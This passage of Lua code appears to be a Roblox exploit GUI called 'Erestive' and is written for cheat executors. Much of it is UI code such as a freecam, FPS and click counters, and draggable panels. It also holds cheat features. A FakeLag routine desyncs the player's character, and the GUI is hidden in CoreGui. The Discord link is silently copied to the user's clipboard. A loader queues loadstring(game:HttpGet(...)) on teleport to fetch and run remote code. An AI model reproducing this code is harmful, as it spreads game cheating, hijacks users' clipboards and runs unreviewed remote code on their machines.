		local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
		local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
		local FOV_WHEEL_SPEED    = 1.0
		local FOV_GAMEPAD_SPEED  = 0.25
		local NAV_ADJ_SPEED      = 0.75
		local NAV_SHIFT_MUL      = 0.25
	
		local navSpeed = 1
	
		function Input.Vel(dt)
			navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)
	
			local kGamepad = Vector3.new(
				thumbstickCurve(gamepad.Thumbstick1.X),
				thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
				thumbstickCurve(-gamepad.Thumbstick1.Y)
			)*NAV_GAMEPAD_SPEED
	
			local kKeyboard = Vector3.new(
				keyboard.D - keyboard.A + keyboard.K - keyboard.H,
				keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
				keyboard.S - keyboard.W + keyboard.J - keyboard.U
			)*NAV_KEYBOARD_SPEED
	
			local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)
	
			return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
		end
	
		function Input.Pan(dt)
			local kGamepad = Vector2.new(
				thumbstickCurve(gamepad.Thumbstick2.Y),
				thumbstickCurve(-gamepad.Thumbstick2.X)
			)*PAN_GAMEPAD_SPEED
			local kMouse = mouse.Delta*PAN_MOUSE_SPEED
			mouse.Delta = Vector2.new()
			return kGamepad + kMouse
		end
	
		function Input.Fov(dt)
			local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
			local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
			mouse.MouseWheel = 0
			return kGamepad + kMouse
		end
	
		do
			local function Keypress(action, state, input)
				keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
				return Enum.ContextActionResult.Sink
			end
	
			local function GpButton(action, state, input)
				gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
				return Enum.ContextActionResult.Sink
			end
	
			local function MousePan(action, state, input)
				local delta = input.Delta
				mouse.Delta = Vector2.new(-delta.y, -delta.x)
				return Enum.ContextActionResult.Sink
			end
	
			local function Thumb(action, state, input)
				gamepad[input.KeyCode.Name] = input.Position
				return Enum.ContextActionResult.Sink
			end
	
			local function Trigger(action, state, input)
				gamepad[input.KeyCode.Name] = input.Position.z
				return Enum.ContextActionResult.Sink
			end
	
			local function MouseWheel(action, state, input)
				mouse[input.UserInputType.Name] = -input.Position.z
				return Enum.ContextActionResult.Sink
			end
	
			local function Zero(t)
				for k, v in pairs(t) do
					t[k] = v*0
				end
			end
	
			function Input.StartCapture()
				ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
					Enum.KeyCode.W, Enum.KeyCode.U,
					Enum.KeyCode.A, Enum.KeyCode.H,
					Enum.KeyCode.S, Enum.KeyCode.J,
					Enum.KeyCode.D, Enum.KeyCode.K,
					Enum.KeyCode.E, Enum.KeyCode.I,
					Enum.KeyCode.Q, Enum.KeyCode.Y,
					Enum.KeyCode.Up, Enum.KeyCode.Down
				)
				ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
				ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
				ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
				ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
				ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
			end
	
			function Input.StopCapture()
				navSpeed = 1
				Zero(gamepad)
				Zero(keyboard)
				Zero(mouse)
				ContextActionService:UnbindAction("FreecamKeyboard")
				ContextActionService:UnbindAction("FreecamMousePan")
				ContextActionService:UnbindAction("FreecamMouseWheel")
				ContextActionService:UnbindAction("FreecamGamepadButton")
				ContextActionService:UnbindAction("FreecamGamepadTrigger")
				ContextActionService:UnbindAction("FreecamGamepadThumbstick")
			end
		end
	end
	
	local function GetFocusDistance(cameraFrame)
		local znear = 0.1
		local viewport = Camera.ViewportSize
		local projy = 2*tan(cameraFov/2)
		local projx = viewport.x/viewport.y*projy
		local fx = cameraFrame.rightVector
		local fy = cameraFrame.upVector
		local fz = cameraFrame.lookVector
	
		local minVect = Vector3.new()
		local minDist = 512
	
		for x = 0, 1, 0.5 do
			for y = 0, 1, 0.5 do
				local cx = (x - 0.5)*projx
				local cy = (y - 0.5)*projy
				local offset = fx*cx - fy*cy + fz
				local origin = cameraFrame.p + offset*znear
				local _, hit = Workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
				local dist = (hit - origin).magnitude
				if minDist > dist then
					minDist = dist
					minVect = offset.unit
				end
			end
		end
	
		return fz:Dot(minVect)*minDist
	end
	
	------------------------------------------------------------------------
	
	local function StepFreecam(dt)
		local vel = velSpring:Update(dt, Input.Vel(dt))
		local pan = panSpring:Update(dt, Input.Pan(dt))
		local fov = fovSpring:Update(dt, Input.Fov(dt))
	
		local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))
	
		cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
		cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
		cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))
	
		local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
		cameraPos = cameraCFrame.p
	
		Camera.CFrame = cameraCFrame
		Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
		Camera.FieldOfView = cameraFov
	end
	
	------------------------------------------------------------------------
	
	local PlayerState = {} do
		local mouseBehavior
		local mouseIconEnabled
		local cameraType
		local cameraFocus
		local cameraCFrame
		local cameraFieldOfView
		local screenGuis = {}
		local coreGuis = {
			Backpack = true,
			Chat = true,
			Health = true,
			PlayerList = true,
		}
		local setCores = {
			BadgesNotificationsActive = true,
			PointsNotificationsActive = true,
		}
	
		-- Save state and set up for freecam
		function PlayerState.Push()
			for name in pairs(coreGuis) do
				coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
				StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
			end
			for name in pairs(setCores) do
				setCores[name] = StarterGui:GetCore(name)
				StarterGui:SetCore(name, false)
			end
			local playergui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
			if playergui then
				for _, gui in pairs(playergui:GetChildren()) do
					if gui:IsA("ScreenGui") and gui.Enabled then
						screenGuis[#screenGuis + 1] = gui
						gui.Enabled = false
					end
				end
			end
	
			cameraFieldOfView = Camera.FieldOfView
			Camera.FieldOfView = 70
	
			cameraType = Camera.CameraType
			Camera.CameraType = Enum.CameraType.Custom
	
			cameraCFrame = Camera.CFrame
			cameraFocus = Camera.Focus
	
			mouseIconEnabled = UserInputService.MouseIconEnabled
			UserInputService.MouseIconEnabled = false
	
			mouseBehavior = UserInputService.MouseBehavior
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		end
	
		-- Restore state
		function PlayerState.Pop()
			for name, isEnabled in pairs(coreGuis) do
				StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
			end
			for name, isEnabled in pairs(setCores) do
				StarterGui:SetCore(name, isEnabled)
			end
			for _, gui in pairs(screenGuis) do
				if gui.Parent then
					gui.Enabled = true
				end
			end
	
			Camera.FieldOfView = cameraFieldOfView
			cameraFieldOfView = nil
	
			Camera.CameraType = cameraType
			cameraType = nil
	
			Camera.CFrame = cameraCFrame
			cameraCFrame = nil
	
			Camera.Focus = cameraFocus
			cameraFocus = nil
	
			UserInputService.MouseIconEnabled = mouseIconEnabled
			mouseIconEnabled = nil
	
			UserInputService.MouseBehavior = mouseBehavior
			mouseBehavior = nil
		end
	end
	
	local function StartFreecam()
		local cameraCFrame = Camera.CFrame
		cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
		cameraPos = cameraCFrame.p
		cameraFov = Camera.FieldOfView
	
		velSpring:Reset(Vector3.new())
		panSpring:Reset(Vector2.new())
		fovSpring:Reset(0)
	
		PlayerState.Push()
		RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
		Input.StartCapture()
	end
	
	local function StopFreecam()
		Input.StopCapture()
		RunService:UnbindFromRenderStep("Freecam")
		PlayerState.Pop()
	end
	
	------------------------------------------------------------------------
	
	do
		local enabled = false
	
		local function ToggleFreecam()
			if enabled then
				StopFreecam()
			else
				StartFreecam()
			end
			enabled = not enabled
		end
	
		local function CheckMacro(macro)
			for i = 1, #macro - 1 do
				if not UserInputService:IsKeyDown(macro[i]) then
					return
				end
			end
			ToggleFreecam()
		end
	
		local function HandleActivationInput(action, state, input)
			if state == Enum.UserInputState.Begin then
				if input.KeyCode == FREECAM_MACRO_KB[#FREECAM_MACRO_KB] then
					CheckMacro(FREECAM_MACRO_KB)
				end
			end
			return Enum.ContextActionResult.Pass
		end
	
		ContextActionService:BindActionAtPriority("FreecamToggle", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, FREECAM_MACRO_KB[#FREECAM_MACRO_KB])
	end
end;
task.spawn(C_6);
-- StarterGui.Erestive.Insert1
local function C_7()
local script = G2L["7"];
	local UserInputService = game:GetService("UserInputService")
	
	function onKeyPress(inputObject, gameProcessedEvent)
		if not gameProcessedEvent then
	    if inputObject.KeyCode == Enum.KeyCode.Insert then 
				if script.Parent.MainFrame.Visible == false then
					script.Parent.MainFrame.Visible = true
				else
					script.Parent.MainFrame.Visible = false
				end
			end
		end
	end
	
	UserInputService.InputBegan:connect(onKeyPress)
end;
task.spawn(C_7);
-- StarterGui.Erestive.CustomShiftLock
local function C_8()
local script = G2L["8"];
	require(script.SmoothShiftLock):Init();
end;
task.spawn(C_8);
-- StarterGui.Erestive.LocalScript
local function C_10()
local script = G2L["10"];
	while wait() do
		wait(0.1)
		script.Parent.Parent.Erestive.Parent = game.CoreGui.RobloxGui
	end
end;
task.spawn(C_10);
-- StarterGui.Erestive.SendNotification
local function C_11()
local script = G2L["11"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local PlayerGui = player:WaitForChild("PlayerGui")
	
	-- Создаем основной контейнер для всех уведомлений
	local NotifyGui = Instance.new("ScreenGui")
	NotifyGui.Name = "NotificationSystem"
	NotifyGui.Parent = PlayerGui
	NotifyGui.ResetOnSpawn = false
	NotifyGui.DisplayOrder = 100
	
	-- Фрейм-контейнер, который будет держать список
	local Holder = Instance.new("Frame")
	Holder.Name = "NotificationHolder"
	Holder.Size = UDim2.new(0, 250, 1, 0)
	Holder.Position = UDim2.new(1, -260, 0, 0) -- Справа с отступом
	Holder.BackgroundTransparency = 1
	Holder.Parent = NotifyGui
	
	-- Список, который управляет позициями (снизу вверх)
	local Layout = Instance.new("UIListLayout")
	Layout.Parent = Holder
	Layout.VerticalAlignment = Enum.VerticalAlignment.Bottom -- Новые внизу
	Layout.SortOrder = Enum.SortOrder.LayoutOrder
	Layout.Padding = UDim.new(0, 10) -- Расстояние между уведомлениями
	
	-- Функция создания уведомления
	local function SendNotification(title, text, duration)
		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(1, 0, 0, 65)
		frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		frame.BorderSizePixel = 0
		frame.BackgroundTransparency = 1 -- Для анимации появления
		frame.Parent = Holder
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(0, 6)
		corner.Parent = frame
	
		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(1, -20, 0, 25)
		titleLabel.Position = UDim2.new(0, 15, 0, 8)
		titleLabel.Text = title
		titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.BackgroundTransparency = 1
		titleLabel.Font = Enum.Font.GothamBold
		titleLabel.TextSize = 14
		titleLabel.TextTransparency = 1 -- Для анимации
		titleLabel.Parent = frame
	
		local descLabel = Instance.new("TextLabel")
		descLabel.Size = UDim2.new(1, -20, 0, 30)
		descLabel.Position = UDim2.new(0, 15, 0, 28)
		descLabel.Text = text
		descLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
		descLabel.TextXAlignment = Enum.TextXAlignment.Left
		descLabel.BackgroundTransparency = 1
		descLabel.Font = Enum.Font.Gotham
		descLabel.TextSize = 13
		descLabel.TextWrapped = true
		descLabel.TextTransparency = 1 -- Для анимации
		descLabel.Parent = frame
	
		-- Плавное появление через TweenService
		local TweenService = game:GetService("TweenService")
		local info = TweenInfo.new(0.4, Enum.EasingStyle.Quart)
	
		TweenService:Create(frame, info, {BackgroundTransparency = 0}):Play()
		TweenService:Create(titleLabel, info, {TextTransparency = 0}):Play()
		TweenService:Create(descLabel, info, {TextTransparency = 0}):Play()
	
		-- Авто-удаление
		task.delay(duration or 3, function()
			local fade = TweenService:Create(frame, info, {BackgroundTransparency = 1})
			TweenService:Create(titleLabel, info, {TextTransparency = 1}):Play()
			TweenService:Create(descLabel, info, {TextTransparency = 1}):Play()
			fade:Play()
			fade.Completed:Wait()
			frame:Destroy()
		end)
	end
	
	-- Логика отслеживания MainFrame
	local MainFrame = script.Parent:WaitForChild("MainFrame")
	
	MainFrame:GetPropertyChangedSignal("Visible"):Connect(function()
		if not MainFrame.Visible then
			SendNotification("GUI", "UI hidden (Keys: Insert/RightAlt)", 3)
		end
	end)
	
	-- Текст, который нужно скопировать
	local textToCopy = "https://discord.gg/dKazKPW3Bn" 
	
	if setclipboard then
		setclipboard(textToCopy)
		-- Опционально: выводим уведомление, которое мы создали ранее
		if SendNotification then
			SendNotification("System", "Welcome to Erestive!", 3)
		else
			print("Welcome to Erestive!")
		end
	elseif toclipboard then
		toclipboard(textToCopy)
		print("Welcome to Erestive!")
	else
		warn("Welcome to Erestive!")
	end
	
end;
task.spawn(C_11);
-- StarterGui.Erestive.loading
local function C_12()
local script = G2L["12"];
	local TeleportService = game:GetService("TeleportService")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local scriptToExecute = [[
	    loadstring(game:HttpGet("https://raw.githubusercontent.com/RovlixTinProject/NeverX/refs/heads/main/EternalX.lua"))()
	]]
	
	-- Проверяем, поддерживает ли чит функцию очереди на телепорт
	if queue_on_teleport then
		player.OnTeleport:Connect(function(State)
			if State == Enum.TeleportState.Started then
				queue_on_teleport(scriptToExecute)
			end
		end)
	else
		print("erestive loading failed")
	end
	
end;
task.spawn(C_12);
-- StarterGui.Erestive.bindsActive.UIDrag
local function C_14()
local script = G2L["14"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_14);
-- StarterGui.Erestive.FakeLag.UIDrag
local function C_26()
local script = G2L["26"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_26);
-- StarterGui.Erestive.FakeLag.ImageLabel.Falling.LocalScript
local function C_2d()
local script = G2L["2d"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local isPlatformStand = false
	local canStandUp = false
	script.Parent.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Humanoid") then
			local humanoid = player.Character.Humanoid
			if not isPlatformStand then
				humanoid.PlatformStand = true
				humanoid:Move(Vector3.new(0, -50, 0))
				canStandUp = true
				isPlatformStand = true
				script.Parent.Parent.Parent.Parent.InformationText.F.Visible = true
			elseif canStandUp then
				humanoid.PlatformStand = false
				isPlatformStand = false
				canStandUp = false
				script.Parent.Parent.Parent.Parent.InformationText.F.Visible = false
			end
		end
	end)
end;
task.spawn(C_2d);
-- StarterGui.Erestive.FakeLag.ImageLabel.Lag.LocalScript
local function C_33()
local script = G2L["33"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local Button = script.Parent
	local ValueState = Button:FindFirstChild("Value") -- Путь к вашему BoolValue
	local TextBoxWait = Button.Parent.WaitTime
	local TextBoxDelay = Button.Parent.DelayTime
	
	local waitTime = 0.05
	local delayTime = 0.4
	
	-- Функция обновления интерфейса
	local function updateUI(state)
		Button.Text = state and "FakeLag: ON" or "FakeLag: OFF"
		local infoText = Button.Parent.Parent.Parent:FindFirstChild("InformationText")
		if infoText and infoText:FindFirstChild("FL") then
			infoText.FL.Visible = state
		end
	end
	
	-- Следим за изменением Value (включая изменения из других скриптов)
	if ValueState then
		ValueState.Changed:Connect(function(newValue)
			updateUI(newValue)
		end)
		-- Синхронизация при запуске
		updateUI(ValueState.Value)
	end
	
	-- Клик по кнопке переключает само Value
	Button.MouseButton1Click:Connect(function()
		if ValueState then
			ValueState.Value = not ValueState.Value
		end
	end)
	
	-- Обновление настроек времени из TextBox
	TextBoxWait.FocusLost:Connect(function()
		waitTime = tonumber(TextBoxWait.Text) or waitTime
	end)
	
	TextBoxDelay.FocusLost:Connect(function()
		delayTime = tonumber(TextBoxDelay.Text) or delayTime
	end)
	
	-- Основной цикл механики
	task.spawn(function()
		while true do
			-- Проверяем значение Value напрямую
			if ValueState and ValueState.Value then
				local character = player.Character
				local root = character and character:FindFirstChild("HumanoidRootPart")
	
				if root then
					root.Anchored = true
					task.wait(delayTime)
					root.Anchored = false
				end
			end
			task.wait(waitTime)
		end
	end)
	
end;
task.spawn(C_33);
-- StarterGui.Erestive.TopInformation.4Frame.TextLabel.LocalScript
local function C_48()
local script = G2L["48"];
	local TimeDisplay = script.Parent
	local startHour = 0   -- Начальные часы
	local startMin = 0    -- Начальные минуты
	local startSec = 0    -- Начальные секунды
	local function UpdateTime(hours, mins, secs)
		if hours > 0 then
			TimeDisplay.Text = string.format("%d:%02d:%02d", hours, mins, secs)
		elseif mins > 0 then
			TimeDisplay.Text = string.format("%d:%02d", mins, secs)
		else
			TimeDisplay.Text = string.format("0:%02d", secs)
		end
	end
	UpdateTime(startHour, startMin, startSec)
	while wait(1) do
		startSec = startSec + 1
		if startSec >= 60 then
			startSec = 0
			startMin = startMin + 1
			if startMin >= 60 then
				startMin = 0
				startHour = startHour + 1
				if startHour >= 24 then
					startHour = 0
				end
			end
		end
		UpdateTime(startHour, startMin, startSec)
	end
end;
task.spawn(C_48);
-- StarterGui.Erestive.TopInformation.3Frame.TextLabel.FPSFUNCTION
local function C_50()
local script = G2L["50"];
	local FPSLabel = script.Parent
	
	local frameTimes = {}
	local frameCount = 0
	local lastUpdateTime = 0
	
	game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
		table.insert(frameTimes, deltaTime)
		frameCount = frameCount + 1
	
		if tick() - lastUpdateTime >= 0.1 then
			local totalFrameTime = 0
			for i, frameTime in ipairs(frameTimes) do
				totalFrameTime = totalFrameTime + frameTime
			end
			local averageFrameTime = totalFrameTime / #frameTimes
			local fps = 1 / averageFrameTime
	
			FPSLabel.Text = math.floor(fps).." fps"
			if fps < 20 then
				FPSLabel.TextColor3 = Color3.new(1, 0, 0) -- red
			elseif fps < 40 then
				FPSLabel.TextColor3 = Color3.new(1, 0.654902, 0.654902) -- red
			elseif fps < 70 then
				FPSLabel.TextColor3 = Color3.new(1, 0.960784, 0.768627) -- yellow
			elseif fps < 130 then
				FPSLabel.TextColor3 = Color3.new(0.780392, 0.780392, 0.780392) -- green
			elseif fps < 250 then
				FPSLabel.TextColor3 = Color3.new(1, 1, 1) -- purple
			elseif fps < 510 then
				FPSLabel.TextColor3 = Color3.new(1, 1, 1) -- gold
			else
				FPSLabel.TextColor3 = Color3.new(0.0666667, 0.321569, 0.639216) -- blue
			end
	
			lastUpdateTime = tick()
			frameTimes = {}
			frameCount = 0
		end
	end)
end;
task.spawn(C_50);
-- StarterGui.Erestive.TopInformation.1Frame.LocalScript
local function C_55()
local script = G2L["55"];
	local players = game:GetService("Players")
	local player = players.LocalPlayer
	
	local Avatar = script.Parent.AvaTextLabel
	
	-- Проверяем, что игрок доступен
	if player then
		-- Получаем фотографию профиля игрока
		local content, isReady = players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size420x420)
	
		-- Проверяем успешность загрузки фотографии
		if isReady then
			Avatar.Image = content
		else
			-- Если фотография не загрузилась, ставим запасное изображение
			Avatar.Image = "rbxassetid://path_to_default_image_here"
		end
	else
		error("Игрок не обнаружен.")
	end
end;
task.spawn(C_55);
-- StarterGui.Erestive.TopInformation.1Frame.TextLabel.script
local function C_57()
local script = G2L["57"];
	local FPSLabel = script.Parent
	
	FPSLabel.Text = game.Players.LocalPlayer.DisplayName
end;
task.spawn(C_57);
-- StarterGui.Erestive.NeverXText.logo.LocalScript
local function C_61()
local script = G2L["61"];
	script.Parent.MouseEnter:Connect(function()
		script.Parent.ImageColor3 = Color3.new(0.239216, 0.239216, 0.239216)
		script.Parent.dropMessage.Visible = true
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.ImageColor3 = Color3.new(1, 1, 1)
		script.Parent.dropMessage.Visible = false
	end)
end;
task.spawn(C_61);
-- StarterGui.Erestive.Keyboard.UIDrag
local function C_6c()
local script = G2L["6c"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_6c);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.4.LocalScript
local function C_76()
local script = G2L["76"];
	-- Ожидаемая клавиша
	local KEY_CODE = Enum.KeyCode.Space
	
	-- Объект текста
	local TEXT = script.Parent
	
	-- Сервис ввода пользователя
	local input = game:GetService("UserInputService")
	
	-- Обработчик начала ввода
	input.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = true
		end
	end)
	
	-- Обработчик окончания ввода
	input.InputEnded:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = false
		end
	end)
end;
task.spawn(C_76);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.4.UIStroke.randbows
local function C_78()
local script = G2L["78"];
	local thing = script.Parent
	local uiGradient = thing:WaitForChild("rainbow")
	local tweenService = game:GetService("TweenService")
	
	while true do
		local tween = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(-1, 0)})
		tween:Play()
		wait(2)
		uiGradient.Offset = Vector2.new(1, 0)
		local tween2 = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(0, 0)})
		tween2:Play()
		wait(2)
	end
end;
task.spawn(C_78);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2.LocalScript
local function C_7f()
local script = G2L["7f"];
	-- Ожидаемый тип ввода (правая кнопка мыши)
	local INPUT_TYPE = Enum.UserInputType.MouseButton1
	
	-- Объект текста
	local TEXT = script.Parent
	
	-- Сервис ввода пользователя
	local input = game:GetService("UserInputService")
	
	-- Обработчик начала ввода
	input.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == INPUT_TYPE then
			TEXT.UIStroke.Enabled = true
		end
	end)
	
	-- Обработчик окончания ввода
	input.InputEnded:Connect(function(inputObject)
		if inputObject.UserInputType == INPUT_TYPE then
			TEXT.UIStroke.Enabled = false
		end
	end)
end;
task.spawn(C_7f);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2.LocalScript
local function C_80()
local script = G2L["80"];
	-- Местоположение Label'а
	local cpsLabel = script.Parent -- Предполагается, что parent у скрипта - это TextLabel
	
	-- Локальная служба для регистрации действий пользователя
	local UIService = game:GetService("UserInputService")
	
	-- Переменные для счета кликов
	local clicksCount = 0
	local lastUpdateTime = tick()
	
	-- Обработчик кликов
	UIService.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
			clicksCount += 1
		end
	end)
	
	-- Функция для расчета CPS и обновления метки
	local function updateCPS()
		local currentTime = tick()
		local elapsedSeconds = currentTime - lastUpdateTime
	
		if elapsedSeconds >= 1 then
			local cpsValue = math.floor(clicksCount / elapsedSeconds)
			cpsLabel.Text = "LMB\n" .. cpsValue .." CPS"
	
			clicksCount = 0
			lastUpdateTime = currentTime
		end
	end
	
	-- Циклическое обновление показателя CPS каждую долю секунды
	game:GetService("RunService").RenderStepped:Connect(updateCPS)
end;
task.spawn(C_80);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2.UIStroke.randbows
local function C_82()
local script = G2L["82"];
	local thing = script.Parent
	local uiGradient = thing:WaitForChild("rainbow")
	local tweenService = game:GetService("TweenService")
	
	while true do
		local tween = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(-1, 0)})
		tween:Play()
		wait(2)
		uiGradient.Offset = Vector2.new(1, 0)
		local tween2 = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(0, 0)})
		tween2:Play()
		wait(2)
	end
end;
task.spawn(C_82);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4.LocalScript
local function C_85()
local script = G2L["85"];
	-- Ожидаемый тип ввода (правая кнопка мыши)
	local INPUT_TYPE = Enum.UserInputType.MouseButton2
	
	-- Объект текста
	local TEXT = script.Parent
	
	-- Сервис ввода пользователя
	local input = game:GetService("UserInputService")
	
	-- Обработчик начала ввода
	input.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == INPUT_TYPE then
			TEXT.UIStroke.Enabled = true
		end
	end)
	
	-- Обработчик окончания ввода
	input.InputEnded:Connect(function(inputObject)
		if inputObject.UserInputType == INPUT_TYPE then
			TEXT.UIStroke.Enabled = false
		end
	end)
end;
task.spawn(C_85);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4.LocalScript
local function C_86()
local script = G2L["86"];
	-- Местоположение Label'а
	local cpsLabel = script.Parent -- Предполагается, что parent у скрипта - это TextLabel
	
	-- Локальная служба для регистрации действий пользователя
	local UIService = game:GetService("UserInputService")
	
	-- Переменные для счета кликов
	local clicksCount = 0
